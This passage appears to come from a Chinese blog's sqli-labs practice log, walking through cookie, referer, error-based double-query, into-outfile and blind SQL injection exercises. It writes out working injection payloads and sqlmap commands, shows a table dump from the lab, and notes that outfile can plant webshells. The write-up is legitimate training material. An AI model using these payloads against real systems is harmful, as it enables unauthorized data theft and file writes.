&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Your IP ADDRESS is: 172.19.0.1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#FFFF00&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#0000ff&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&lt;/span>Your Referer is: http://im.hacker/&amp;#39;&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;172.19.0.1&amp;#39;)&amp;#39; at line 1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;../images/flag.jpg&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>确认注入ok，接着用 sqlmap 就行。&lt;/p>
&lt;h2 id="less-20">Less-20&lt;/h2>
&lt;p>提示 Cookie Injection，但是无论登陆成功失败都没有设置 Cookie。尝试随便设置一个 cookie &lt;code>id=...&lt;/code>，再刷新页面，并无效果，于是开始怀疑是不是说的 &lt;code>PHPSESSID&lt;/code>，再次尝试&lt;code>PHPSESSID=1'&amp;quot;&lt;/code>，依然没有作用。发愁。&lt;/p>
&lt;p>看了眼 Less-20 的源码，发现代码里明确写了 &lt;code>!isset($_COOKIE['uname'])&lt;/code>，再试一次&lt;code>uname=admin'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511153246874.png"
width="1034"
height="484"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511153246874_hu2f31f2a7d2b8d032615a7d3377928641_25660_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511153246874_hu2f31f2a7d2b8d032615a7d3377928641_25660_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511153246874"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="512px"
>&lt;/p>
&lt;p>有效果，问题变成了如何完成注入。审阅源码得知只有满足 &lt;code>isset($_COOKIE['uname'])&lt;/code> 和 &lt;code>!isset($_POST['submit'])&lt;/code> 的情况下才会进入带查询的分支。所以只需要在这个页面不用&lt;code>ctrl+r&lt;/code>（因为会重新POST表单），点地址栏再回车就进入了带查询的页面。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511160609383.png"
width="1756"
height="299"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511160609383_hu5abf0d1e914b80362d218ae596ff943f_230809_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511160609383_hu5abf0d1e914b80362d218ae596ff943f_230809_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511160609383"
class="gallery-image"
data-flex-grow="587"
data-flex-basis="1409px"
>&lt;/p>
&lt;p>可以看到下方有MySQL的错误信息，接下来只需要用 sqlmap 或者手工构造个 error based 爆破即可。&lt;/p>
&lt;h2 id="less-21">Less-21&lt;/h2>
&lt;p>依然是 Cookie 注入，但是是 &lt;code>complex&lt;/code> 版本，我倒要看看有多复杂。直接上 Less-20 的 &lt;code>uname=admin'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511161052493.png"
width="1826"
height="456"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511161052493_hu61dd0aa5ba2f1e5b56487313df680442_279311_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511161052493_hu61dd0aa5ba2f1e5b56487313df680442_279311_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511161052493"
class="gallery-image"
data-flex-grow="400"
data-flex-basis="961px"
>&lt;/p>
&lt;p>注意有个特殊的错误信息。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &amp;#39;=&amp;#39;
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>谷歌搜索可知这是因为查询的字符集有差异，尝试比较&lt;code>gbk_chinese_ci&lt;/code>和&lt;code>latin1&lt;/code>。这里我们了解下&lt;code>gbk&lt;/code>是宽字符集，定长 2 字节，而 &lt;code>latin1&lt;/code> 是一个极为特殊的字符集，&lt;code>ascii&lt;/code>包括了&lt;code>u+0001~u+0080&lt;/code>，&lt;code>latin1&lt;/code>正好包括了&lt;code>u+0080~u+00ff&lt;/code>，也就是单字节除了&lt;code>0x00&lt;/code>外全部都可以解释成 &lt;code>ascii&lt;/code> 和 &lt;code>latin1&lt;/code> 而不出现编码错误，经常被当成默认字符编码。&lt;/p>
&lt;p>回到正题，测试中发现&lt;code>'&lt;/code>没有报错，所以继续尝试&lt;code>&amp;quot;&lt;/code>，依然没报错，问题变得奇怪起来了。直接开始审阅代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162312174.png"
width="762"
height="92"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162312174_hu4ef0d4381ebf42bd569d9e59e2965081_14037_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162312174_hu4ef0d4381ebf42bd569d9e59e2965081_14037_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511162312174"
class="gallery-image"
data-flex-grow="828"
data-flex-basis="1987px"
>&lt;/p>
&lt;p>发现有个 &lt;code>base64_decode&lt;/code>，把 &lt;code>payload&lt;/code> 编码一下：&lt;code>YWRtaW4nCg&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162411345.png"
width="1826"
height="339"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162411345_hud870b9a61a73ac91f63091af877b397d_90354_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511162411345_hud870b9a61a73ac91f63091af877b397d_90354_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511162411345"
class="gallery-image"
data-flex-grow="538"
data-flex-basis="1292px"
>&lt;/p>
&lt;p>报错成功。接下来手工构造一个 error based 注入或者 sqlmap 加上 base64 tamper 即可。&lt;/p>
&lt;h2 id="less-22">Less-22&lt;/h2>
&lt;p>21和22两题都没法从前端得到太多信息，还是直接看代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163010736.png"
width="810"
height="138"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163010736_hu07dac01f7d23a8aa7d3161316428c4c9_21977_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163010736_hu07dac01f7d23a8aa7d3161316428c4c9_21977_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511163010736"
class="gallery-image"
data-flex-grow="586"
data-flex-basis="1408px"
>&lt;/p>
&lt;p>一个 &lt;code>base64_decode&lt;/code> 加上 &lt;code>&amp;quot;&amp;quot;&lt;/code> 连接，我们编码一下 payload：&lt;code>YWRtaW4iCg&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163108492.png"
width="1737"
height="422"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163108492_hu50d70535ba4af8130891cc1d181a8148_280079_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511163108492_hu50d70535ba4af8130891cc1d181a8148_280079_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511163108492"
class="gallery-image"
data-flex-grow="411"
data-flex-basis="987px"
>&lt;/p>
&lt;p>报错成功，接下来手工构造 error based 注入或者 sqlmap 都行，不重复了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image.png"
width="1140"
height="1038"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image_hu15bdcbb5037c607898701ef384a9ee2b_81003_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image_hu15bdcbb5037c607898701ef384a9ee2b_81003_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="sqli-labs page-1"
class="gallery-image"
data-flex-grow="109"
data-flex-basis="263px"
>&lt;/p>
&lt;p>至此，整个 sqli-labs page-1 的所有题目就都做完了。&lt;/p>
&lt;p>自我感觉 sqli 的基础应该是掌握差不多了，也有了信心和耐心。考虑接下来是做 page-2 还是找 xss-labs ，打打 xss 的基础。或者一起来也行，预计 page-2 可能会稍难点，大概，做不过就试试 xss-labs。&lt;/p></description></item><item><title>sqli-labs 实验记录 #2</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-2/</link><pubDate>Tue, 10 May 2022 15:14:45 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>开始 sqli-labs 的第二轮训练。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>!!!ATTENTION!!!&lt;/strong>&lt;/p>
&lt;p>在 MySQL 5.7.36 更新中，修复了 group by 报错 &lt;code>Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;'&lt;/code> 的问题。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-36.html" target="_blank" rel="noopener"
>Changes in MySQL 5.7.36 (2021-10-19, General Availability)&lt;/a>&lt;/p>
&lt;p>When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.&lt;/p>
&lt;p>We fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)&lt;/p>
&lt;/blockquote>
&lt;p>使用的 MySQL 版本 &amp;gt;=5.7.36 时，Less 5 和 Less 6 使用的 &lt;code>select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x;&lt;/code> 不会再报错。这个利用被彻底堵死了。&lt;/p>
&lt;/blockquote>
&lt;h2 id="less-5-error-based-double-query">Less-5 Error-Based Double Query&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>有一篇&lt;a class="link" href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/" target="_blank" rel="noopener"
>很好的文章&lt;/a>解释了这里的 Double Injection 指的是什么。我尽量概括一下。&lt;/p>
&lt;p>先忽略 &lt;em>Double Injection&lt;/em> 这个不明所以的名字，它代表技术原理的是利用 &lt;code>group by &amp;lt;col&amp;gt;&lt;/code> 产生临时表，&lt;code>col&lt;/code> 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的&lt;code>col&lt;/code>内容是什么，由此产生信息泄露。&lt;/p>
&lt;p>以一个案例来解释。下面的查询里&lt;code>version()&lt;/code>是想爆的列，&lt;code>concat(...)&lt;/code>连接目标列和随机数序列构造一个尽可能快出现冲突的&lt;code>group key&lt;/code>。&lt;code>floor(rand(14)*2)&lt;/code>产生的序列前四个结果是&lt;code>1,0,1,0&lt;/code>，插入过程会产生两个&lt;code>rand&lt;/code>调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>；第二次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>，报错违反唯一性约束。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>其中一个比较有趣的点是为什么要用&lt;code>rand&lt;/code>，能不能写一个固定值？&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;hello&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不行，这样做等于&lt;code>group by&lt;/code>常量或者一个列，和普通&lt;code>group by&lt;/code>没区别。&lt;code>rand&lt;/code>发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nf">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tally&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不使用&lt;code>rand&lt;/code>时&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>接收的就是同一个&lt;code>group_key&lt;/code>，使用&lt;code>rand&lt;/code>后&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>就可能用的不是同一个&lt;code>group_key&lt;/code>了，导致进入&lt;code>insert&lt;/code>时插入的是已存在的&lt;code>group_key&lt;/code>。&lt;/p>
&lt;p>另一个有趣的问题是为什么要有&lt;code>count(*)&lt;/code>？去掉&lt;code>count(*)&lt;/code>就会导致不再报错。&lt;/p>
&lt;p>等大佬解释。&lt;/p>
&lt;h3 id="题解">题解&lt;/h3>
&lt;p>&lt;code>?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215.png"
width="974"
height="215"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510135044215"
class="gallery-image"
data-flex-grow="453"
data-flex-basis="1087px"
>&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Attention：&lt;/strong> MySQL版本 &amp;gt;=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。&lt;/p>
&lt;/blockquote>
&lt;h2 id="less-6-error-based-double-query">Less-6 Error-Based Double Query&lt;/h2>
&lt;p>和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：&lt;code>?id=1&amp;quot; union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135.png"
width="1107"
height="326"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510140208135"
class="gallery-image"
data-flex-grow="339"
data-flex-basis="814px"
>&lt;/p>
&lt;h2 id="less-7-dump-into-outfile">Less-7 Dump into Outfile&lt;/h2>
&lt;blockquote>
&lt;p>**注意：**这题不要求 Error-Based 了，请注意。&lt;/p>
&lt;/blockquote>
&lt;h3 id="原理-1">原理&lt;/h3>
&lt;p>简而言之，两个方面：&lt;/p>
&lt;ol>
&lt;li>利用 MySQL 的 &lt;code>select ... into outfile|dumpfile &amp;lt;filepath&amp;gt;&lt;/code> 语法把查询结果保存到文件。&lt;/li>
&lt;li>利用 MySQL 的 &lt;code>LOAD DATA&lt;/code> 和 &lt;code>LOAD XML&lt;/code> 语句读出任意文件内容。&lt;/li>
&lt;/ol>
&lt;p>第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。&lt;/p>
&lt;p>第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。&lt;/p>
&lt;h3 id="题解-1">题解&lt;/h3>
&lt;p>本题没有回显，虽然可以按盲注爆破，但题目提示是使用 &lt;code>outfile&lt;/code>。所以最简单的解法就是两步走。&lt;/p>
&lt;ol>
&lt;li>注入 &lt;code>SELECT ... INTO DUMPFILE&lt;/code> 导出结果到文件。&lt;/li>
&lt;li>注入 &lt;code>LOAD DATA&lt;/code> 进而拿到结果。&lt;/li>
&lt;/ol>
&lt;p>先确认注入类型：&lt;/p>
&lt;ul>
&lt;li>&lt;code>?id=1 and 1=0;--%20&lt;/code> 无效&lt;/li>
&lt;li>&lt;code>?id=1' and 1=0;--%20&lt;/code> 报错&lt;/li>
&lt;li>&lt;code>?id=1&amp;quot; and 1=0;--%20&lt;/code> 无效&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400.png"
width="1106"
height="320"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510142759400"
class="gallery-image"
data-flex-grow="345"
data-flex-basis="829px"
>&lt;/p>
&lt;p>所以是字符型注入，但SQL语句未知，尝试补括号：&lt;code>?id=1') and 1=1;--%20&lt;/code>，依然报错，补两个括号后发现变正常：&lt;code>?id=1')) and 1=1;--%20&lt;/code>。完成注入类型确认。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936.png"
width="1100"
height="337"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510142812936"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="783px"
>&lt;/p>
&lt;p>接着把&lt;code>and&lt;/code>条件去掉，改成&lt;code>into outfile '/var/www/html/dump.txt'&lt;/code>，完整 payload：&lt;code>?id=1')) into outfile '/var/www/html/dump.txt';--%20&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>**注意：**docker方式部署请注意，MySQL 镜像默认启用了 &lt;code>--secure-file-priv&lt;/code> 选项，这个选项会禁用 &lt;code>select .. into outfile|dumpfile&lt;/code>，使注入的SQL执行失败。&lt;/p>
&lt;p>**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使&lt;code>select ... into outfile ...&lt;/code> 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。&lt;/p>
&lt;/blockquote>
&lt;p>上述注入如果成功的话可以直接访问 &lt;code>http://localhost:8080/dump.txt&lt;/code> 下载到查询结果了。&lt;/p>
&lt;h2 id="less-8-blind-boolian">Less-8 Blind Boolian&lt;/h2>
&lt;p>题目是布尔盲注。确认 SQL 注入类型：&lt;code>?id=1' and 1=1;--%20&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127.png"
width="1135"
height="335"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510144442127"
class="gallery-image"
data-flex-grow="338"
data-flex-basis="813px"
>&lt;/p>
&lt;p>典型的盲注，不自己动手了，接下来直接上 sqlmap。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-8/?id=1&amp;#39;&lt;/span> --technique B -p id -T users --dump
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">Database: security
Table: users
[13 entries]
+------+----------+------------+
| id | username | password |
+------+----------+------------+
| 1 | Dumb | Dumb |
| 2 | Angelina | I-kill-you |
| 3 | Dummy | p@ssword |
| 4 | secure | crappy |
| 5 | stupid | stupidity |
| 6 | superman | genious |
| 7 | batman | mob!le |
| 8 | admin | admin |
| 9 | admin1 | admin1 |
| 10 | admin2 | admin2 |
| 11 | admin3 | admin3 |
| 12 | dhakkan | dumbo |
| 14 | admin4 | admin4 |
+------+----------+------------+
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>done。&lt;/p>
&lt;h2 id="less-9-blind-time-based">Less-9 Blind Time-Based&lt;/h2>
&lt;p>基于时间的盲注，先测试注入类型：&lt;code>?id=1' and sleep(1);--%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175.png"
width="415"
height="322"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220510145029175"
class="gallery-image"
data-flex-grow="128"
data-flex-basis="309px"
>&lt;/p>
&lt;p>确认注入类型成功。接着还是上 sqlmap。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
